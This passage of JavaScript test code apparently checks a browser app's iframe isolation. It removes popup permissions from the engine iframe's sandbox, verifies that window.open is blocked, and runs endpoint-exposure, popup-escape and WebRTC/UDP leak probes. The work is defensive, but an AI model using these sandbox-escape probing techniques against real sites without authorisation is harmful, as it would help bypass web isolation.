  // (b) strip allow-popups* from the engine iframe sandbox and reload: window.open is neutered -> OAuth popups break.
  {
    const context = await ctx.newContext(browser);
    try {
      const app = await ctx.openApp(context, { route: 'test', fallback: '0' });
      // Rewrite the engine iframe sandbox (no allow-popups / allow-popups-to-escape-sandbox) and re-handshake.
      await app.page.evaluate(() => new Promise((resolve) => {
        const f = document.getElementById('engine');
        f.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-modals allow-downloads allow-pointer-lock allow-presentation');
        const t = setInterval(() => { if (window.gnomeTest && window.gnomeTest.init) { clearInterval(t); resolve(); } }, 200);
        window.gnomeTest.init = null;
        f.src = f.src; // reload the engine host under the new sandbox
        setTimeout(() => resolve(), 30000);
      }));
      await app.waitInit(40000).catch(() => {});
      const a = await app.navigate(1, `${TARGET_ORIGIN}/iso/probe`, { create: true, engine, timeout: 45000 });
      await readOut(app, 1, 20000);
      const frame = app.tabFrame(1);
      let opened = 'frame missing';
      if (frame && a.ok) opened = await ev(frame, () => { const H = window.top[0]; const w = H.open('https://example.com/oauth', '_blank'); return w ? 'returned a window' : 'null (popup blocked -> OAuth/payment popups break)'; }).catch((e) => 'threw ' + e.name);
      ctx.record({ test: 'popup:no-allow-popups', result: /null/.test(String(opened)) ? 'pass' : 'partial', notes: `without allow-popups: window.open -> ${opened}. Trade-off: window.open must be routed through an engine-host -> app tab.openRequest; OAuth/payment popups that need a real window break`, data: { opened } });
    } finally { for (const p of context.pages()) await p.close().catch(() => {}); await context.close(); }
  }
}

export async function run(ctx) {
  const sink = await udpSink();
  const browser = await ctx.launch({ extraPrefs: RTC_LOOPBACK });
  const guard = async (label, fn) => { try { await fn(); } catch (e) { ctx.record({ test: `${label}:error`, result: 'fail', notes: String(e && (e.message || e)).slice(0, 200) }); } };
  try {
    for (const engine of ENGINES) await guard(`engine:${engine}`, () => engineRun(ctx, browser, engine, sink));
    if (PARTS.has('endpoints')) await guard('endpoints', () => endpointExposure(ctx, browser));
    if (PARTS.has('popup')) await guard('popup', () => popupEscape(ctx, browser));
  } finally {
    await browser.close();
    await sink.close();
  }
  void STUN_PORT;
}
